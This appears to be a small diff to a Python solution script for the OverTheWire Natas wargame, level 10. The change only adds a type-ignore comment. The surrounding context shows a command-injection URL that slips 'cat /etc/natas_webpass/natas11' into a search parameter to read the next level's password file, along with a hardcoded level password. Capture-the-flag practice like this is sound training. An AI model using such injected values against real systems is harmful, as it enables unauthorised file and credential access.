@@ -54,7 +54,7 @@
 # http://natas10.natas.labs.overthewire.org/?needle=a%20+%20cat%20/etc/natas_webpass/natas11&submit=Search
 
 
-import requests,re
+import requests,re # type: ignore
 
 auth_user="natas10"
 auth_pass="t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu"
